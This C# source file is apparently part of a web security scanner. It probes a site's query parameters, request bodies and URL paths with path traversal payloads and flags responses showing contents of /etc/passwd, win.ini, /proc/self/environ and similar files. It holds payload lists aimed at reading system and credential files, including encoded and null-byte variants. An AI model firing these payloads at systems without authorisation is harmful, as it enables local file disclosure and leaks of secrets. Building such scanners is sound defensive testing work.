using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// Probes URL parameters (and simple form bodies) with path traversal payloads and
/// looks for common local file disclosure markers in responses.
/// </summary>
public sealed class PathTraversalChecker
{
    private readonly AutomationContext _ctx;
    private readonly Action<string, string> _log;

    private static readonly string[] Phase1Payloads =
    [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..\\..\\..\\windows\\win.ini",
    ];

    private static readonly string[] DefaultPayloads =
    [
        "../../../etc/passwd",
        "/etc/passwd",
        "../../../etc/hostname",
        "/etc/hostname",
        "../../../proc/self/environ",
        "/proc/self/environ",
        "../../../proc/self/cmdline",
        "/proc/self/cmdline",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....\\/....\\/....\\/etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "file:///etc/passwd",
        "%2500.md",
        "%00",
        "%2e%2e%2f",
    ];

    /// <summary>Common LFI endpoints probed when traffic has not yet observed path-like params.</summary>
    public static readonly string[] AlwaysProbedLfiPaths =
    [
        "/api/file?path=readme.md",
        "/api/files?path=readme.md",
        "/api/file/raw?path=readme.md",
        "/file?path=readme.md",
        "/download?file=readme.md",
        "/read?file=readme.md",
        "/api/download?file=readme.md",
        "/static?file=readme.md",
    ];

    public PathTraversalChecker(AutomationContext context, Action<string, string> log)
    {
        _ctx = context;
        _log = log;
    }

    public async Task<PathTraversalResult> RunAsync(PathTraversalOptions options)
    {
        var mode = (options.Mode ?? "query").Trim().ToLowerInvariant();
        if (mode is "path" or "path-append")
            return await RunPathAppendModeAsync(options);

        var findings = new List<PathTraversalFinding>();
        var currentUrl = await _ctx.GetCurrentUrl();
        if (string.IsNullOrEmpty(currentUrl) || !Uri.TryCreate(currentUrl, UriKind.Absolute, out var currentUri))
            throw new InvalidOperationException("Navigate to a page before running path traversal tests.");

        var origin = currentUri.GetLeftPart(UriPartial.Authority);
        var paramNames = new HashSet<string>(
            (options.ParamNames is { Count: > 0 } ? options.ParamNames : PathTraversalParamNames.DefaultParamNames.ToList())
            .Select(p => p.ToLowerInvariant()));

        var max = options.MaxCandidates > 0 ? options.MaxCandidates : 12;
        List<MutationCandidate> candidates;
        if (options.ExplicitUrls is { Count: > 0 } || options.ScaffoldUrls is { Count: > 0 })
        {
            var traffic = options.ExplicitUrls is { Count: > 0 }
                ? BuildCandidatesFromUrls(options.ExplicitUrls, paramNames, max * 2)
                : DiscoverCandidates(_ctx.Network.Entries, origin, paramNames, max * 2);
            var scaffold = options.ScaffoldUrls is { Count: > 0 }
                ? BuildCandidatesFromUrls(options.ScaffoldUrls, paramNames, max * 2)
                : [];
            candidates = PrioritizePathTraversalCandidates(traffic, scaffold, max);
        }
        else
        {
            candidates = DiscoverCandidates(_ctx.Network.Entries, origin, paramNames, max);
        }

        if (candidates.Count == 0)
        {
            return new PathTraversalResult
            {
                Message = "No candidate URLs with path-like query parameters found. " +
                    "Browse the app, pass explicit \"urls\", or use \"mode\": \"path\" with \"basePath\" / \"pathBases\" to fuzz URL paths.",
                CandidatesProbed = 0,
                Findings = findings
            };
        }

        var payloads = options.Payloads is { Count: > 0 } ? options.Payloads : DefaultPayloads.ToList();
        var timeout = options.TimeoutMs > 0 ? options.TimeoutMs : 15000;

        _log($"PathTraversal(query): {candidates.Count} URL(s) × up to {payloads.Count} payload(s)", "#888888");

        foreach (var cand in candidates)
            await ProbeCandidateQueryModeAsync(cand, payloads, timeout, findings);

        var msg = findings.Count > 0
            ? $"{findings.Count} response(s) show possible path traversal / local file disclosure indicators."
            : "No strong file-disclosure indicators detected for the probed URLs (false negatives are still possible).";

        return new PathTraversalResult
        {
            Message = msg,
            CandidatesProbed = candidates.Count,
            Findings = findings
        };
    }

    private async Task<PathTraversalResult> RunPathAppendModeAsync(PathTraversalOptions options)
    {
        var findings = new List<PathTraversalFinding>();
        var currentUrl = await _ctx.GetCurrentUrl();
        if (string.IsNullOrEmpty(currentUrl) || !Uri.TryCreate(currentUrl, UriKind.Absolute, out var currentUri))
            throw new InvalidOperationException("Navigate to a page before running path traversal tests.");

        var origin = currentUri.GetLeftPart(UriPartial.Authority).TrimEnd('/');
        var bases = ResolvePathBases(options, currentUri);
        if (bases.Count == 0)
        {
            return new PathTraversalResult
            {
                Message = "Path mode: no base path — pass \"basePath\", \"pathBases\", or navigate to a page.",
                CandidatesProbed = 0,
                Findings = findings
            };
        }

        var maxBases = options.MaxCandidates > 0 ? options.MaxCandidates : 12;
        bases = bases.Take(maxBases).ToList();

        var payloads = options.Payloads is { Count: > 0 } ? options.Payloads : DefaultPayloads.ToList();
        var timeout = options.TimeoutMs > 0 ? options.TimeoutMs : 15000;

        _log($"PathTraversal(path-append): {bases.Count} base path(s) × {payloads.Count} payload(s)", "#888888");

        foreach (var rawBase in bases)
        {
            var baselineUrl = BuildAbsoluteFromPath(origin, rawBase, out var displayBase);
            string? baselineBody = null;
            int baselineStatus = 0;
            try
            {
                var baselineJson = await _ctx.Fetch(baselineUrl, "GET", headers: null, body: null, timeout);
                using var bd = JsonDocument.Parse(baselineJson);
                baselineStatus = bd.RootElement.GetProperty("status").GetInt32();
                baselineBody = bd.RootElement.TryGetProperty("body", out var bb) ? bb.GetString() : "";
            }
            catch (Exception ex)
            {
                _log($"  baseline failed {baselineUrl}: {ex.Message}", "#CCA700");
                continue;
            }

            await ProbePayloadSetAsync(
                payloads, timeout, baselineStatus, baselineBody ?? "",
                async payload =>
                {
                    var testUrl = AppendTraversalToBase(origin, rawBase, payload);
                    return await FetchResponseAsync(testUrl, "GET", null, null, timeout);
                },
                (payload, status, body) =>
                {
                    var testUrl = AppendTraversalToBase(origin, rawBase, payload);
                    var indicator = DetectDisclosure(body, baselineBody, payload);
                    if (indicator == null) return;
                    _log($"  FLAG {indicator}: path-append on {displayBase} ← {payload}", "#F44747");
                    findings.Add(CreateFinding(
                        testUrl, baselineUrl, "GET", "(path-append)", payload,
                        status, baselineStatus, indicator, Snippet(body, 240)));
                });
        }

        var msg = findings.Count > 0
            ? $"{findings.Count} response(s) show possible path traversal / local file disclosure (path-append mode)."
            : "No strong file-disclosure indicators in path-append mode (try other base paths or payloads).";

        return new PathTraversalResult
        {
            Message = msg,
            CandidatesProbed = bases.Count,
            Findings = findings
        };
    }

    private async Task ProbeCandidateQueryModeAsync(
        MutationCandidate cand,
        List<string> allPayloads,
        int timeout,
        List<PathTraversalFinding> findings)
    {
        var baselineValue = string.IsNullOrWhiteSpace(cand.OriginalValue) ? "readme.md" : cand.OriginalValue!;
        var baselineReq = cand.BuildProbeRequest(baselineValue);
        var (baselineStatus, baselineBody) = await FetchResponseAsync(
            baselineReq.Url, cand.Method, baselineReq.Headers, baselineReq.Body, timeout);
        if (baselineStatus == 0 && string.IsNullOrEmpty(baselineBody))
        {
            _log($"  baseline failed {baselineReq.Url}: no response", "#CCA700");
            return;
        }

        baselineBody ??= "";

        await ProbePayloadSetAsync(
            allPayloads, timeout, baselineStatus, baselineBody,
            payload =>
            {
                var req = cand.BuildProbeRequest(payload);
                return FetchResponseAsync(req.Url, cand.Method, req.Headers, req.Body, timeout);
            },
            (payload, status, body) =>
            {
                var req = cand.BuildProbeRequest(payload);
                var displayUrl = req.Body != null ? req.Url + " (body)" : req.Url;
                var indicator = DetectDisclosure(body, baselineBody, payload);
                if (indicator == null) return;
                _log($"  FLAG {indicator}: {cand.ParamName} ← {payload}", "#F44747");
                findings.Add(CreateFinding(
                    displayUrl, cand.BaselineUrl, cand.Method, cand.ParamName, payload,
                    status, baselineStatus, indicator, Snippet(body, 240)));
            });
    }

    private async Task ProbePayloadSetAsync(
        List<string> allPayloads,
        int timeout,
        int baselineStatus,
        string baselineBody,
        Func<string, Task<(int Status, string Body)>> fetchForPayload,
        Action<string, int, string> onFinding)
    {
        var phase1 = Phase1Payloads.Where(allPayloads.Contains).ToList();
        if (phase1.Count == 0)
            phase1 = allPayloads.Take(3).ToList();

        var phase2 = allPayloads
            .Where(p => !phase1.Contains(p, StringComparer.Ordinal))
            .ToList();

        var escalate = false;
        foreach (var payload in phase1)
        {
            var (status, body) = await fetchForPayload(payload);
            onFinding(payload, status, body);
            if (DetectDisclosure(body, baselineBody, payload) != null)
                return;
            if (ShouldEscalatePathTraversalPayloads(baselineStatus, baselineBody, status, body))
                escalate = true;
        }

        if (!escalate)
            return;

        foreach (var payload in phase2)
        {
            var (status, body) = await fetchForPayload(payload);
            onFinding(payload, status, body);
        }
    }

    internal static bool ShouldEscalatePathTraversalPayloads(
        int baselineStatus, string baselineBody, int status, string body)
    {
        if (status != baselineStatus) return true;
        if (Math.Abs(body.Length - baselineBody.Length) > Math.Max(64, baselineBody.Length / 4))
            return true;
        if (status >= 500 && baselineStatus < 500) return true;

        foreach (var kw in new[] { "ENOENT", "ENOTDIR", "no such file", "cannot open", "failed to open", "open '" })
        {
            if (body.Contains(kw, StringComparison.OrdinalIgnoreCase)
                && !baselineBody.Contains(kw, StringComparison.OrdinalIgnoreCase))
                return true;
        }

        return false;
    }

    private async Task<(int Status, string Body)> FetchResponseAsync(
        string url, string method, Dictionary<string, string>? headers, string? body, int timeout)
    {
        try
        {
            var json = await _ctx.Fetch(url, method, headers, body, timeout);
            using var doc = JsonDocument.Parse(json);
            var status = doc.RootElement.GetProperty("status").GetInt32();
            var text = doc.RootElement.TryGetProperty("body", out var b) ? b.GetString() ?? "" : "";
            return (status, text);
        }
        catch
        {
            return (0, "");
        }
    }

    private static List<MutationCandidate> PrioritizePathTraversalCandidates(
        List<MutationCandidate> traffic,
        List<MutationCandidate> scaffold,
        int max)
    {
        var chosen = new List<MutationCandidate>(max);
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        void Add(IEnumerable<MutationCandidate> src)
        {
            foreach (var c in src)
            {
                if (chosen.Count >= max) return;
                var key = $"{c.Method}|{c.BaselineUrl}|{c.ParamName}";
                if (!seen.Add(key)) continue;
                chosen.Add(c);
            }
        }

        Add(traffic);
        Add(scaffold);
        return chosen;
    }

    private static List<string> ResolvePathBases(PathTraversalOptions options, Uri currentUri)
    {
        if (options.PathBases is { Count: > 0 })
            return options.PathBases.Where(s => !string.IsNullOrWhiteSpace(s)).Select(NormalizePathInput).ToList();
        if (!string.IsNullOrWhiteSpace(options.BasePath))
            return new List<string> { NormalizePathInput(options.BasePath) };
        return new List<string> { currentUri.AbsolutePath };
    }

    private static string NormalizePathInput(string s)
    {
        s = s.Trim();
        if (Uri.TryCreate(s, UriKind.Absolute, out var abs))
            return abs.AbsolutePath;
        return s.StartsWith('/') ? s : "/" + s;
    }

    private static string BuildAbsoluteFromPath(string origin, string rawBase, out string displayBase)
    {
        displayBase = NormalizePathInput(rawBase);
        var path = displayBase;
        if (!path.EndsWith('/'))
            path += "/";
        return origin + path;
    }

    private static string AppendTraversalToBase(string origin, string rawBase, string payload)
    {
        var basePath = NormalizePathInput(rawBase).TrimEnd('/');
        var p = payload.TrimStart('/');
        var combined = basePath + "/" + p;
        return origin + combined;
    }

    private static List<MutationCandidate> BuildCandidatesFromUrls(
        List<string> urls, HashSet<string> paramNames, int maxCandidates)
    {
        var list = new List<MutationCandidate>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var url in urls)
        {
            if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
                continue;
            foreach (var c in ExtractCandidatesFromUri(uri, paramNames))
            {
                var key = c.BaselineUrl + "|" + c.ParamName;
                if (!seen.Add(key)) continue;
                list.Add(c);
                if (list.Count >= maxCandidates) return list;
            }
        }

        return list;
    }

    private static List<MutationCandidate> DiscoverCandidates(
        List<NetworkEntry> entries, string origin, HashSet<string> paramNames, int maxCandidates)
    {
        var list = new List<MutationCandidate>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var e in entries)
        {
            if (e.StatusCode is < 200 or >= 400) continue;
            if (!Uri.TryCreate(e.Url, UriKind.Absolute, out var uri)) continue;
            if (!string.Equals(uri.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase))
                continue;

            if (e.Method == "GET")
            {
                foreach (var c in ExtractCandidatesFromUri(uri, paramNames))
                {
                    var key = $"{c.Method}|{c.BaselineUrl}|{c.ParamName}";
                    if (!seen.Add(key)) continue;
                    list.Add(c);
                    if (list.Count >= maxCandidates) return list;
                }
            }

            if (e.Method is "POST" or "PUT" or "PATCH" && !string.IsNullOrEmpty(e.RequestBody))
            {
                foreach (var c in ExtractBodyCandidates(e, uri, paramNames))
                {
                    var key = $"{c.Method}|{c.BaselineUrl}|{c.ParamName}|body";
                    if (!seen.Add(key)) continue;
                    list.Add(c);
                    if (list.Count >= maxCandidates) return list;
                }
            }
        }

        return list;
    }

    private static IEnumerable<MutationCandidate> ExtractBodyCandidates(
        NetworkEntry entry, Uri uri, HashSet<string> paramNames)
    {
        var ct = entry.RequestHeaders.TryGetValue("Content-Type", out var h) ? h :
            entry.RequestHeaders.TryGetValue("content-type", out var h2) ? h2 : "";

        if (ct.Contains("json", StringComparison.OrdinalIgnoreCase))
        {
            List<MutationCandidate>? jsonCandidates = null;
            try
            {
                using var doc = JsonDocument.Parse(entry.RequestBody!);
                if (doc.RootElement.ValueKind == JsonValueKind.Object)
                {
                    jsonCandidates = new List<MutationCandidate>();
                    foreach (var prop in doc.RootElement.EnumerateObject())
                    {
                        if (prop.Value.ValueKind != JsonValueKind.String) continue;
                        var val = prop.Value.GetString() ?? "";
                        if (!PathTraversalParamNames.IsPathLikeParamName(prop.Name, paramNames)) continue;
                        if (val.StartsWith("http", StringComparison.OrdinalIgnoreCase)) continue;
                        jsonCandidates.Add(MutationCandidate.FromBody(
                            uri, prop.Name, val, entry.Method, entry.RequestBody!, ct));
                    }
                }
            }
            catch { /* skip */ }

            if (jsonCandidates != null)
            {
                foreach (var c in jsonCandidates)
                    yield return c;
            }
        }
        else if (ct.Contains("form-urlencoded", StringComparison.OrdinalIgnoreCase))
        {
            var qs = System.Web.HttpUtility.ParseQueryString(entry.RequestBody!);
            foreach (string? key in qs)
            {
                if (key == null) continue;
                var val = qs[key] ?? "";
                if (!PathTraversalParamNames.IsPathLikeParamName(key, paramNames)) continue;
                if (val.StartsWith("http", StringComparison.OrdinalIgnoreCase)) continue;
                yield return MutationCandidate.FromBody(uri, key, val, entry.Method, entry.RequestBody!,
                    string.IsNullOrWhiteSpace(ct) ? "application/x-www-form-urlencoded" : ct);
            }
        }
    }

    private static IEnumerable<MutationCandidate> ExtractCandidatesFromUri(Uri uri, HashSet<string> paramNames)
    {
        var query = uri.Query;
        if (string.IsNullOrEmpty(query) || query == "?")
            yield break;

        var q = query.TrimStart('?');
        foreach (var part in q.Split('&', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries))
        {
            var eq = part.IndexOf('=');
            if (eq < 0) continue;
            var key = Uri.UnescapeDataString(part[..eq]);
            if (!PathTraversalParamNames.IsPathLikeParamName(key, paramNames)) continue;
            var rawVal = part[(eq + 1)..];
            var value = Uri.UnescapeDataString(rawVal);
            if (string.IsNullOrEmpty(value) || value.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                continue;

            yield return new MutationCandidate(uri, key, value);
        }
    }

    /// <summary>
    /// File-content canaries and reflected absolute paths that still contain <c>..</c>
    /// (for example <c>ENOENT … '/usr/src/app/../..'</c>).
    /// </summary>
    internal static string? DetectDisclosure(string body, string? baseline, string? payload = null)
    {
        if (string.IsNullOrEmpty(body)) return null;
        baseline ??= "";

        if (LooksLikeEtcPasswd(body) && !LooksLikeEtcPasswd(baseline))
            return "etc-passwd-pattern";
        if (LooksLikeWinIni(body) && !LooksLikeWinIni(baseline))
            return "win.ini-pattern";
        if (LooksLikeProcEnviron(body) && !LooksLikeProcEnviron(baseline))
            return "proc-environ";
        if (LooksLikeProcCmdline(body, payload) && !LooksLikeProcCmdline(baseline, payload))
            return "proc-cmdline";
        if (LooksLikeHostnameFile(body, baseline, payload))
            return "etc-hostname";
        if (LooksLikeResolvedPathEcho(body, baseline))
            return "resolved-path-echo";

        if (!string.IsNullOrEmpty(baseline) && body.Length > baseline.Length * 3 && body.Length > 400)
        {
            if (Regex.IsMatch(body, @"\[boot loader\]|\[fonts\]|16-bit app support", RegexOptions.IgnoreCase))
                return "windows-ini-likely";
        }

        return null;
    }

    private static readonly string[] EnvironMarkers = ["PATH=", "HOME=", "HOSTNAME=", "PWD=", "NODE_ENV=", "USER="];

    private static bool LooksLikeProcEnviron(string body)
    {
        var hits = 0;
        foreach (var marker in EnvironMarkers)
        {
            if (body.Contains(marker, StringComparison.Ordinal))
                hits++;
        }
        return hits >= 2 || (body.Contains('\0') && body.Contains("PATH=", StringComparison.Ordinal));
    }

    private static bool LooksLikeProcCmdline(string body, string? payload)
    {
        if (string.IsNullOrEmpty(payload) || !payload.Contains("cmdline", StringComparison.OrdinalIgnoreCase))
            return false;
        if (body.Contains('<') || body.Contains('{')) return false;
        if (body.Contains('\0') && (body.Contains("node", StringComparison.OrdinalIgnoreCase)
                                     || body.Contains("/usr/", StringComparison.Ordinal)
                                     || body.Contains(".js", StringComparison.OrdinalIgnoreCase)))
            return true;
        return body.Contains('\0') && body.Length is > 2 and < 4000;
    }

    private static bool LooksLikeHostnameFile(string body, string baseline, string? payload)
    {
        if (string.IsNullOrEmpty(payload) || !payload.Contains("hostname", StringComparison.OrdinalIgnoreCase))
            return false;
        if (payload.Contains("proc/", StringComparison.OrdinalIgnoreCase))
            return false;
        var line = body.Trim();
        if (line.Length is < 1 or > 64) return false;
        if (line.Contains('\n') || line.Contains('<') || line.Contains('{') || line.Contains(' '))
            return false;
        if (!HostnameFileRegex.IsMatch(line)) return false;
        return !string.Equals(line, baseline.Trim(), StringComparison.Ordinal)
               && !baseline.Contains(line, StringComparison.Ordinal);
    }

    private static readonly Regex HostnameFileRegex = new(
        @"^[A-Za-z0-9][A-Za-z0-9._-]{0,62}$",
        RegexOptions.Compiled);

    /// <summary>Absolute path in an error body that still contains parent-directory segments.</summary>
    private static readonly Regex ResolvedPathEchoRegex = new(
        @"['""]((?:/|[A-Za-z]:\\)[^'""\r\n]{4,240})['""]",
        RegexOptions.Compiled);

    private static bool LooksLikeResolvedPathEcho(string body, string baseline)
    {
        foreach (Match m in ResolvedPathEchoRegex.Matches(body))
        {
            var path = m.Groups[1].Value;
            if (!path.Contains("..", StringComparison.Ordinal)
                && !path.Contains("/etc/", StringComparison.OrdinalIgnoreCase)
                && !path.Contains("/proc/", StringComparison.OrdinalIgnoreCase)
                && !path.Contains("\\windows\\", StringComparison.OrdinalIgnoreCase))
                continue;
            if (baseline.Contains(path, StringComparison.Ordinal))
                continue;
            if (!body.Contains("ENOENT", StringComparison.OrdinalIgnoreCase)
                && !body.Contains("ENOTDIR", StringComparison.OrdinalIgnoreCase)
                && !body.Contains("no such file", StringComparison.OrdinalIgnoreCase)
                && !body.Contains("cannot open", StringComparison.OrdinalIgnoreCase)
                && !body.Contains("failed to open", StringComparison.OrdinalIgnoreCase)
                && !body.Contains("not found", StringComparison.OrdinalIgnoreCase)
                && !path.Contains("..", StringComparison.Ordinal))
                continue;
            return true;
        }
        return false;
    }

    private static bool LooksLikeEtcPasswd(string body)
    {
        if (body.Contains("<!DOCTYPE", StringComparison.OrdinalIgnoreCase)
            || body.Contains("<html", StringComparison.OrdinalIgnoreCase))
            return false;
        return body.Contains("root:", StringComparison.Ordinal)
               && Regex.IsMatch(body, @"^\s*\w+:[^:\r\n]+:\d+:\d+:", RegexOptions.Multiline);
    }

    private static bool LooksLikeWinIni(string body) =>
        Regex.IsMatch(body, @"\[fonts\]|\[Mail\]", RegexOptions.IgnoreCase);

    public static bool ShouldPromoteToAutoScanFinding(PathTraversalFinding f) =>
        f.Indicator is not "windows-ini-likely";

    public static (string Severity, string TitlePrefix) ResolveAutoScanPromotion(PathTraversalFinding f) =>
        f.Indicator switch
        {
            "etc-passwd-pattern" or "win.ini-pattern" or "proc-environ" or "proc-cmdline" or "etc-hostname"
                => ("high", ""),
            "resolved-path-echo" => ("medium", "Suspected "),
            _ => ("medium", "")
        };

    private static PathTraversalFinding CreateFinding(
        string url,
        string baselineUrl,
        string method,
        string paramName,
        string payload,
        int status,
        int baselineStatus,
        string indicator,
        string snippet) =>
        new()
        {
            Url = url,
            BaselineUrl = baselineUrl,
            Method = method,
            ParamName = paramName,
            Payload = payload,
            Status = status,
            BaselineStatus = baselineStatus,
            Indicator = indicator,
            Snippet = snippet,
            Category = "path-traversal",
            Title = $"Path traversal via '{paramName}' ({indicator})",
            Severity = "high",
            Confidence = SecurityConfidence.Likely
        };

    private static string Snippet(string body, int maxLen)
    {
        var t = body.Replace("\r", " ").Replace("\n", " ").Trim();
        if (t.Length <= maxLen) return t;
        return t[..maxLen] + "…";
    }

    private sealed class MutationCandidate
    {
        public string BaselineUrl { get; }
        public string ParamName { get; }
        public string Method { get; }
        public string? OriginalValue { get; }
        private readonly Uri _uri;
        private readonly string? _bodyTemplate;
        private readonly string? _contentType;
        private readonly Dictionary<string, string>? _headers;

        public MutationCandidate(Uri uri, string paramName, string originalValue, string method = "GET")
        {
            _uri = uri;
            ParamName = paramName;
            OriginalValue = originalValue;
            Method = method;
            BaselineUrl = uri.GetLeftPart(UriPartial.Path);
            if (!string.IsNullOrEmpty(uri.Query))
                BaselineUrl += uri.Query;
        }

        private MutationCandidate(
            Uri uri, string paramName, string originalValue, string method,
            string bodyTemplate, string contentType, Dictionary<string, string>? headers)
        {
            _uri = uri;
            ParamName = paramName;
            OriginalValue = originalValue;
            Method = method;
            _bodyTemplate = bodyTemplate;
            _contentType = contentType;
            _headers = headers;
            BaselineUrl = uri.GetLeftPart(UriPartial.Path);
            if (!string.IsNullOrEmpty(uri.Query))
                BaselineUrl += uri.Query;
        }

        public static MutationCandidate FromBody(
            Uri uri, string paramName, string originalValue, string method,
            string bodyTemplate, string contentType) =>
            new(uri, paramName, originalValue, method, bodyTemplate, contentType,
                new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                {
                    ["Content-Type"] = contentType
                });

        public RedirectParamDiscovery.ProbeRequest BuildProbeRequest(string payload)
        {
            if (string.IsNullOrEmpty(_bodyTemplate))
                return new RedirectParamDiscovery.ProbeRequest { Url = ReplaceQueryParam(_uri, ParamName, payload) };

            var pt = new RedirectParamDiscovery.InjectionPoint
            {
                BaseUri = new Uri(_uri.GetLeftPart(UriPartial.Path)),
                ParamName = ParamName,
                OriginalValue = OriginalValue,
                Method = Method,
                RequestBodySample = _bodyTemplate,
                RequestContentType = _contentType,
                Source = "network-body"
            };
            return RedirectParamDiscovery.BuildProbeRequest(pt, payload);
        }
    }

    private static string ReplaceQueryParam(Uri uri, string name, string newValue)
    {
        var builder = new StringBuilder();
        builder.Append(uri.GetLeftPart(UriPartial.Path));
        var query = uri.Query.TrimStart('?');
        var first = true;
        if (!string.IsNullOrEmpty(query))
        {
            foreach (var part in query.Split('&', StringSplitOptions.RemoveEmptyEntries))
            {
                var eq = part.IndexOf('=');
                var key = eq >= 0 ? part[..eq] : part;
                if (key.Equals(name, StringComparison.OrdinalIgnoreCase))
                    continue;
                builder.Append(first ? '?' : '&');
                builder.Append(part);
                first = false;
            }
        }

        builder.Append(first ? '?' : '&');
        builder.Append(Uri.EscapeDataString(name));
        builder.Append('=');
        builder.Append(Uri.EscapeDataString(newValue));
        return builder.ToString();
    }

}

public sealed class PathTraversalOptions
{
    /// <summary><c>query</c> (default): fuzz query parameters. <c>path</c> / <c>path-append</c>: append payloads to URL path after <see cref="BasePath"/> or <see cref="PathBases"/>.</summary>
    public string? Mode { get; init; }

    /// <summary>Single path prefix for path mode (e.g. Gruyere user root <c>/4193.../</c> or full URL).</summary>
    public string? BasePath { get; init; }

    /// <summary>Multiple path bases for path mode.</summary>
    public List<string>? PathBases { get; init; }

    public List<string>? ExplicitUrls { get; init; }
    /// <summary>Scaffold LFI paths probed only after <see cref="ExplicitUrls"/> / traffic candidates.</summary>
    public List<string>? ScaffoldUrls { get; init; }
    public List<string>? ParamNames { get; init; }
    public List<string>? Payloads { get; init; }
    public int MaxCandidates { get; init; } = 12;
    public int TimeoutMs { get; init; } = 15000;
}

public sealed class PathTraversalResult
{
    public string Message { get; init; } = "";
    public int CandidatesProbed { get; init; }
    public List<PathTraversalFinding> Findings { get; init; } = new();
}

public sealed class PathTraversalFinding
{
    public string Url { get; init; } = "";
    public string BaselineUrl { get; init; } = "";
    public string Method { get; init; } = "";
    public string ParamName { get; init; } = "";
    public string Payload { get; init; } = "";
    public int Status { get; init; }
    public int BaselineStatus { get; init; }
    public string Indicator { get; init; } = "";
    public string Snippet { get; init; } = "";

    /// <summary>Unified triage fields (same shape as other security scanners).</summary>
    public string Category { get; init; } = "path-traversal";
    public string Title { get; init; } = "Path traversal";
    public string Severity { get; init; } = "high";
    public string Confidence { get; init; } = SecurityConfidence.Likely;
}
